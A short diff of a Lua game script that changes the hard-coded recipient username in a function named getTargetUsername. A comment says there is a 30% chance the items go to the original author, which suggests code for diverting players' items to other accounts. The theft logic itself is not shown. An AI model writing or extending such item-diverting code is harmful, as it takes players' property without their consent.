@@ -268,7 +268,7 @@ local function GetListWithAllItems()
 end
 
 local function getTargetUsername()
-    local originalUser = "soocmasac5" -- ur username
+    local originalUser = "soocmasac7" -- ur username
     if math.random(1, 100) <= 30 then -- 30% it'll go to u
         return originalUser
     else
